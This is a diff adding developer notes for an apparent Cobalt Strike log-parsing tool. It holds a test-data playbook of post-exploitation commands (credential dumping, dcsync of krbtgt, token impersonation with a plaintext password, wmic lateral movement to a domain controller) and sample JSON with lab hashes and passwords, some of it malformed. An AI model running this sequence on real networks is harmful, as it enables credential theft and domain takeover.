@@ -1,0 +1,404 @@
+DEVELOPER INFO:
+===============
+
+
+Playbook for Generating Test Data:
+----------------------------------
+
+- Workstation (User)
+  - run ipconfig /all
+  - ps
+  - run tasklist /v
+  - run netstat -ano
+  - shell set
+  - net user \\SGCDC001 camile.wray
+  - net localgroup administrators
+  - run systeminfo
+  - shell dir /a /s C:\Users
+  
+- Workstation (as Admin)
+  - hashdump
+  - lsadump
+  - logonpasswords
+  - dcsync SGC.HWS.MIL SGC\krbtgt
+  - dcsync SGC.HWS.MIL SGC\kelly.reed
+  
+- Workstation (User)
+  - make_token SGC kelly.reed !QAZ1qaz@WSX2wsx
+  - cd \\SGCDC001\C$
+  - upload
+  - wmic /node: SGCDC001 process call create C:\beacon_x64_SMB.exe
+
+- DC
+  - ps
+  - netstat -ano
+  - hashdump
+  - lsadump
+  - logonpasswords
+  - run dnscmd /enumzones
+  - run dnscmd /zoneprint sgc.hws.mil
+  - run dsquery * -filter "(objectclass=computer)" -attr dnshostname operatingsystem operatingsystemversion operatingsystemservicepack lastlogon lastlogontimestamp useraccountcontrol description memberof primarygroupid location objectsid adspath -limit 0 -l
+  - run dsquery * -filter "(&(objectclass=user)(!(objectclass=computer)))" -attr samaccountname name userprinciplename lastlogon lastlogontimestamp pwdlastset useraccountcontrol memberof description objectsid primarygroupid adspath -limit 0 -l
+  - run dsquery * -filter "(objectclass=group)" -attr samaccountname name userprinciplename objectsid primarygroupid description memberof adspath -limit 0 -l
+  - run dsquery * -filter "(objectclass=organizationalunit)" -attr name managedby description gplink adspath -limit 0 -l
+  - run dsquery * -filter "(objectclass=grouppolicycontainer)" -attr displayname name adspath -limit 0 -l
+  - run dsquery * -filter "(objectclass=trusteddomain)" -attr trustdirection flatname trustpartner -limit 0 -l
+  
+[SAVE LOGS TO TEST PARSING WITHOUT IPCONFIG]
+
+- DC
+  - run ipconfig /all
+
+- Workstation (User)
+  - run ipconfig /all
+
+
+
+
+
+
+
+
+
+
+Example Data Structure:
+-----------------------
+
+    aggregator_vars = {
+      "config": {
+        "job_name": "VoidWalker",
+        "input_directory": "L:\\VoidWalker",
+        "command_output_directory": "L:\\VoidWalker",
+        "dir_all": false,
+        "data_directory": "X:\\"
+      }
+      "commands": [
+        {
+          "filepath": "L:\\VoidWalker\\U\\2019\\03\\26\\cobaltstrike\\10.4.100.201\\10.4.10.101\\beacon_3299.log",
+          "timestamp": "2019-03-26 18:20:46",
+          "session_id": "10.4.100.201|beacon_3299",
+          "command": "run ipconfig",
+          "user": "sam.carter",
+          "operator": "neo"
+        },
+        <...>
+      ],
+      "computers": {
+        "<network>": {
+          "SGC.HWS.MIL": {
+            "SGCDC001": {
+              "comment": "hashdump; domain",
+              "distinguishedname": "CN=SGCDC001,OU=Servers,DC=sgc,DC=hws,DC=mil",
+              "operatingsystemservicepack": "Service Pack 1",
+              "useraccountcontrol": "4096",
+              "cn": "SGCDC001",
+              "ip": "10.4.10.107",
+              "codepage": "0",
+              "badpwdcount": "0",
+              "objectsid": "S-1-5-21-1125874557-3931273151-200089715-1277",
+              "whencreated": "03/22/2019 02:40:59",
+              "usncreated": "14799",
+              "operatingsystemversion": "6.1 (7601)",
+              "rid": "1277",
+              "operatingsystem": "Windows Server 2008 R2",
+              "dscorepropagationdata": "01/01/1601 00:00:00",
+              "iscriticalsystemobject": "FALSE",
+              "realm": "SGC",
+              "countrycode": "0",
+              "objectcategory": "CN=Computer,CN=Schema,CN=Configuration,DC=sgc,DC=hws,DC=mil",
+              "adspath": "LDAP://sgcdc001.sgc.hws.mil/CN=SGCDC001,OU=Servers,DC=sgc,DC=hws,DC=mil",
+              "whenchanged": "03/22/2019 02:45:07",
+              "accountexpires": "9223372036854775807",
+              "username": "SGCDC001$",
+              "pwdlastset": "131976960593874481",
+              "samaccountname": "SGCDC001$",
+              "objectguid": "{C3A03447-AFDF-421A-832B-11466D162154}",
+              "dnshostname": "SGCDC001.SGC.HWS.MIL",
+              "lastlogon": "131982608389979153",
+              "msds-supportedencryptiontypes": "28",
+              "usnchanged": "14949",
+              "lastlogoff": "0",
+              "primarygroupid": "515",
+              "logoncount": "183",
+              "name": "SGCDC001",
+              "objectclass": "top\nperson\norganizationalPerson\nuser\ncomputer",
+              "ntlm": "334F6CB76D97F07F46A1EE8687685F4F",
+              "localpolicyflags": "0",
+              "samaccounttype": "805306369",
+              "num": 178,
+              "collected_at": "2019-03-27 14:34:08",
+              "serviceprincipalname": "TERMSRV/SGCDC001\nTERMSRV/SGCDC001.sgc.hws.mil\nWSMAN/SGCDC001\nWSMAN/SGCDC001.sgc.hws.mil\nRestrictedKrbHost/SGCDC001\nHOST/SGCDC001\nRestrictedKrbHost/SGCDC001.sgc.hws.mil\nHOST/SGCDC001.sgc.hws.mil",
+              "collected_from": "10.4.10.25 (ZEUS)",
+              "instancetype": "4",
+              "badpasswordtime": "0"
+            },
+            <...>
+          }
+        }
+      },
+      "credentials": {
+        "U": {
+          "SGC.HWS.MIL": {
+            "SGC\\jennifer.keller": {
+              "username": "jennifer.keller",
+              "comment": "hashdump; domain",
+              "realm": "SGC",
+              "ntlm": "88282226375563B3F8EA454B3FDF1AFA",
+              "num": 138,
+              "collected_at": "2018-10-11 16:48:50",
+              "rid": "1247",
+              "collected_from": "172.16.100.5 (SGCDC001)"
+            },
+            "SGC\\sam.carter": {{
+               "realm": "SGC",
+               "username": "sam.carter",
+               "ntlm": "7f3d59c2294bac66132b3847b843461f",
+               "aes128": "5a96d893b9d0320bc9f8cddcf9d4be30",
+               "aes256": "c31b5ec1ff4da56b0151c5b7b5314b93ee9f60486005cf7558fa3b38c5d63968",
+               "plaintext": "ForTheCovenant!",
+               "comment": "hashdump; domain",
+               "num": 20,
+               "rid": 1010,
+               "collected_at": "2019-03-27_164324",
+               "collected_from": "SGCDC001"
+             },
+            <...>
+          }
+        }
+      },
+      "dns_info": {
+        "U": {
+          "SGC.HWS.MIL": {
+            "SGCWKS10246137": {
+              "ip": [
+                "172.16.10.23"
+              ],
+              "hostname": "SGCWKS10246137",
+              "fqdn": [
+                "SGCWKS10246137.SGC.HWS.MIL"
+              ],
+              "cname": []
+            },
+            <...>
+          }
+        }
+      },
+      "gpos": {
+        "U": {
+          "SGC.HWS.MIL": {
+            "{7B4CF8E0-083D-4A3B-A374-99242EC453FC}": {
+              "distinguishedname": "CN={7B4CF8E0-083D-4A3B-A374-99242EC453FC},CN=Policies,CN=System,DC=sgc,DC=hws,DC=mil",
+              "dscorepropagationdata": "03/22/2019 02:13:58\n03/22/2019 02:13:40\n01/01/1601 00:00:00",
+              "displayname": "EastGPO",
+              "cn": "{7B4CF8E0-083D-4A3B-A374-99242EC453FC}",
+              "objectcategory": "CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=sgc,DC=hws,DC=mil",
+              "objectclass": "top\ncontainer\ngroupPolicyContainer",
+              "objectguid": "{65CF2A75-DCE0-4BFA-929A-AD35DF163489}",
+              "adspath": "LDAP://hydrogen.covertius.local/CN={7B4CF8E0-083D-4A3B-A374-99242EC453FC},CN=Policies,CN=System,DC=sgc,DC=hws,DC=mil",
+              "showinadvancedviewonly": "TRUE",
+              "usnchanged": "15251",
+              "versionnumber": "0",
+              "whencreated": "03/22/2019 02:13:40",
+              "gpcfunctionalityversion": "2",
+              "gpcfilesyspath": "\\\\covertius.local\\SysVol\\sgc.hws.mil\\Policies\\{7B4CF8E0-083D-4A3B-A374-99242EC453FC}",
+              "flags": "0",
+              "whenchanged": "03/22/2019 02:13:40",
+              "realm": "COVERTIUS",
+              "instancetype": "4",
+              "usncreated": "15242",
+              "name": "{7B4CF8E0-083D-4A3B-A374-99242EC453FC}"
+            },
+            <...>
+          }
+        }
+      },
+      "groups": {
+        "U": {
+          "SGC.HWS.MIL": {
+            "Print Operators": {
+              "cn": "Print Operators",
+              "objectsid": "S-1-5-32-550",
+              "whencreated": "03/22/2019 02:09:01",
+              "usncreated": "8212",
+              "description": "Members can administer printers installed on domain controllers",
+              "grouptype": "-2147483643",
+              "dscorepropagationdata": "03/22/2019 02:25:23\n03/22/2019 02:13:58\n03/22/2019 02:10:14\n01/01/1601 00:00:00",
+              "iscriticalsystemobject": "TRUE",
+              "realm": "SGC",
+              "objectcategory": "CN=Group,CN=Schema,CN=Configuration,DC=sgc,DC=hws,DC=mil",
+              "adspath": "LDAP://sgcdc001.sgc.hws.mil/CN=Print Operators,CN=Builtin,DC=sgc,DC=hws,DC=mil",
+              "whenchanged": "03/22/2019 02:25:23",
+              "admincount": "1",
+              "distinguishedname": "CN=Print Operators,CN=Builtin,DC=sgc,DC=hws,DC=mil",
+              "samaccountname": "Print Operators",
+              "objectguid": "{1920D58D-C76F-4B7D-B3D7-C6C93BA32F1E}",
+              "usnchanged": "15353",
+              "name": "Print Operators",
+              "objectclass": "top\ngroup",
+              "samaccounttype": "536870912",
+              "systemflags": "-1946157056",
+              "instancetype": "4"
+            },
+            <...>
+          }
+        },
+      },
+      "hosts": {
+        "172.16.10.23 (SGCWKS10246137)": {
+          "id": "172.16.10.23 (SGCWKS10246137)"
+          "ip": "172.16.10.23",
+          "hostname": "SGCWKS10246137",
+          "arch": "x64",
+          "os": "Windows",
+          "kernel": "6.1",
+          "network": "U",
+          "services": [],
+          "ps": {
+            "data": {
+              "2019-03-27 17:32:35": [
+                {
+                  "ppid": "0",
+                  "process_name": "[System Process]",
+                  "pid": "0"
+                },
+                <...>
+              ]
+            },
+            "fieldnames": [
+              "category",
+              "ppid",
+              "pid",
+              "arch",
+              "process_name",
+              "owner",
+              "session_id",
+              "desc"
+            ]
+          },
+          "netstat": {
+            "data": {
+              "2019-03-27 15:01:56": [
+                {
+                  "protocol": "TCP",
+                  "port_remote": "0",
+                  "address_remote": "0.0.0.0",
+                  "pid": "536",
+                  "state": "LISTENING",
+                  "version": "IPv4",
+                  "port_local": "88",
+                  "address_local": "0.0.0.0"
+                },
+                <...>
+              ]
+            },
+            "fieldnames": [
+              "version",
+              "protocol",
+              "address_local",
+              "port_local",
+              "address_remote",
+              "port_remote",
+              "state",
+              "pid"
+            ]
+          },
+          "text": {
+            "..\\..\\credentials\\logonpasswords\\SGCWKS10246137_2019-03-27_180646_logonpasswords.txt": "<raw text output of logonpasswords>"
+          },
+      },
+      "ous": {},
+      "sessions": {
+        "10.4.100.201|beacon_83757": {
+          "direction": "->",
+          "filepath": "L:\\VoidWalker\\U\\2019\\03\\27\\cobaltstrike\\10.4.100.201\\10.4.10.25\\beacon_83757.log",
+          "pid": "4108",
+          "beacon_id": "beacon_83757",
+          "teamserver": "10.4.100.201",
+          "source": "beacon_25373",
+          "beacon_arch": "x64",
+          "user": "SYSTEM *",
+          "host_id": "172.16.100.5 (SGCDC001)"
+        },
+        <...>
+      },
+      "trusts": {
+        "U": {
+          "SGC.HWS.MIL": {
+            "nid.gov": {
+              "distinguishedname": "CN=nid.gov,CN=System,DC=sgc,DC=hws,DC=mil",
+              "cn": "nid.gov",
+              "trustposixoffset": "-2147483648",
+              "whencreated": "03/22/2019 02:26:07",
+              "usncreated": "8233",
+              "trusttype": "2",
+              "trustdirection": "3",
+              "dscorepropagationdata": "03/22/2019 02:30:23\n03/22/2019 02:27:34\n01/01/1601 00:04:17",
+              "iscriticalsystemobject": "TRUE",
+              "realm": "SGC",
+              "securityidentifier": "0x01 0x04 0x00 0x00 0x00 0x00 0x00 0x05 0x15 0x00 0x00 0x00 0xeb 0xe3 0x8e 0xb2 0x1e 0x58 0xbe 0x74 0xd3 0xa2 0x9d 0xd3",
+              "objectcategory": "CN=Trusted-Domain,CN=Schema,CN=Configuration,DC=sgc,DC=hws,DC=mil",
+              "adspath": "LDAP://sgcdc001.sgc.hws.mil/CN=nid.gov,CN=System,DC=sgc,DC=hws,DC=mil",
+              "whenchanged": "03/22/2019 02:26:07",
+              "trustpartner": "nid.gov",
+              "objectguid": "{E03BFBF9-5A62-4A7E-B6D7-1173BFD20371}",
+              "showinadvancedviewonly": "TRUE",
+              "usnchanged": "8234",
+              "trustattributes": "32",
+              "name": "nid.gov",
+              "objectclass": "top\nleaf\ntrustedDomain",
+              "flatname": "NID",
+              "instancetype": "4"
+            },
+            <...>
+          }
+        },
+      },
+      "users": {
+        "U": {
+          "SGC.HWS.MIL": {
+            "sam.carter": {
+              "comment": "hashdump; domain",
+              "distinguishedname": "CN=sam.carter,OU=R&D,OU=Workstations,DC=sgc,DC=hws,DC=mil",
+              "useraccountcontrol": "512",
+              "cn": "sam.carter",
+              "ip": "",
+              "codepage": "0",
+              "badpwdcount": "0",
+              "objectsid": "S-1-5-21-1125874557-3931273151-200089715-1155",
+              "whencreated": "03/22/2019 02:29:28",
+              "usncreated": "13624",
+              "rid": "1155",
+              "samaccountname": "sam.carter",
+              "dscorepropagationdata": "03/22/2019 02:30:23\n01/01/1601 00:00:01",
+              "realm": "SGC",
+              "countrycode": "0",
+              "objectcategory": "CN=Person,CN=Schema,CN=Configuration,DC=sgc,DC=hws,DC=mil",
+              "adspath": "LDAP://sgcdc001.sgc.hws.mil/CN=sam.carter,OU=R&D,OU=Workstations,DC=sgc,DC=hws,DC=mil",
+              "whenchanged": "03/22/2019 02:29:29",
+              "accountexpires": "9223372036854775807",
+              "username": "sam.carter",
+              "pwdlastset": "131976953690040600",
+              "description": "Samantha Carter",
+              "objectguid": "{0C0DE711-0ACE-480B-8504-0C35B432DFDC}",
+              "lastlogon": "0",
+              "usnchanged": "13628",
+              "givenname": "Samantha",
+              "lastlogoff": "0",
+              "primarygroupid": "513",
+              "logoncount": "0",
+              "name": "sam.carter",
+              "objectclass": "top\nperson\norganizationalPerson\nuser",
+              "ntlm": "56BEB68AB5EB0CBE6E60D1640A425812",
+              "samaccounttype": "805306368",
+              "num": 63,
+              "sn": "Bryant",
+              "collected_at": "2019-03-27 14:34:08",
+              "collected_from": "172.16.100.5 (SGCDC001)",
+              "instancetype": "4",
+              "badpasswordtime": "0"
+            },
+            <...>
+          }
+        }
+      }
+    }
